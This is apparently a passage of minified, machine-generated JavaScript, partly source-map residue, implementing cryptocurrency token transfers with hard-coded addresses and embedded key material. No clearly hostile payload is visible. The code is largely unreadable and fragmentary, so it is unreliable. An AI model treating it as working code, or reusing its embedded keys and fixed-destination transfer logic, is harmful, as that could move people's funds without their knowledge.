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"}